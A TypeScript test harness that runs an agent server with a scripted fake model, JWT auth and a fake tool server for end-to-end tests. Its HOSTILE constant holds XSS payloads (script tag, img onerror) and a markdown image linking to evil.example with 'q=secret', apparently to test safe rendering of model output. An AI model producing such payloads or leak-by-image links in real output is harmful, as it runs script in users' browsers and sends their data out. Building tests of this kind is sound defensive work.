/**
 * agent-pi with a scripted model: the real server, durable storage and event stream, on real JWTs from the test
 * stack's auth-server. The prompt picks the script.
 */
import { JwtAuthenticator } from "../../../agent-pi/packages/agent-pi/src/auth/jwt.ts";
import { fakeMcpServer, fauxAssistantMessage, fauxText, fauxToolCall, startTestAgent, testConfig } from "../../../agent-pi/packages/agent-pi/src/testing.ts";

const AUTH = "http://localhost:18081";
const SLOW = "This is a slow reply. ".repeat(60);
const DOCUMENT = `# Customer brief\n\n${"The account has grown steadily over the last year. ".repeat(40)}`;
const HOSTILE = '<img src=x onerror="window.pwned=1"><script>window.pwned=1</script>\n\n![leak](https://evil.example/leak.png?q=secret)\n\n[site](https://evil.example)';

type Context = { messages: readonly { role: string; content: unknown }[] };

function lastUserText(context: Context): string {
	const message = [...context.messages].reverse().find((candidate) => candidate.role === "user");
	const content = message?.content;
	if (typeof content === "string") return content;
	return ((content ?? []) as { type: string; text?: string }[]).map((block) => block.text ?? "").join("");
}

function respond(context: Context) {
	const last = context.messages.at(-1);
	if (last?.role === "toolResult") return fauxAssistantMessage([fauxText("The tool finished.")]);
	const text = lastUserText(context);
	if (text.includes("slow")) return fauxAssistantMessage([fauxText(SLOW)]);
	if (text.includes("document")) return fauxAssistantMessage([fauxText(DOCUMENT)]);
	if (text.includes("hostile")) return fauxAssistantMessage([fauxText(HOSTILE)]);
	if (text.includes("tool")) return fauxAssistantMessage([fauxText("Checking."), fauxToolCall("crm_lookup", {})], { stopReason: "toolUse" });
	return fauxAssistantMessage([fauxText(`Echo: ${text}`)]);
}

const base = testConfig();
const mcp = fakeMcpServer([
	{
		name: "lookup",
		description: "Look something up",
		call: async () => {
			await new Promise((resolve) => setTimeout(resolve, 1500));
			return "found";
		},
	},
]);
const agent = await startTestAgent({
	mcp,
	tokensPerSecond: 200,
	configStorage: true,
	responses: Array.from({ length: 500 }, () => respond as never),
	authenticator: new JwtAuthenticator({ algorithms: ["ES256"], jwksUrl: `${AUTH}/.well-known/jwks.json`, issuer: AUTH, audience: "t10", requiredScopes: ["agent:use"], tenantClaim: "tid" }),
	config: {
		agent: "assistant",
		instanceId: "e2e",
		port: 19800,
		storage: { kind: "sqlite", path: process.env.E2E_STORAGE ?? "/dev/null" },
		limits: { ...base.limits, maxSessionsPerUser: 200, maxBodyBytes: 16_000_000 },
		profiles: { chat: { ...base.profiles.chat!, alwaysOnTools: ["crm:*"] } },
		defaultProfile: "chat",
	},
});
console.log(`mock agent on ${agent.url}`);
for (const signal of ["SIGINT", "SIGTERM"] as const) process.on(signal, () => void agent.close().then(() => process.exit(0)));
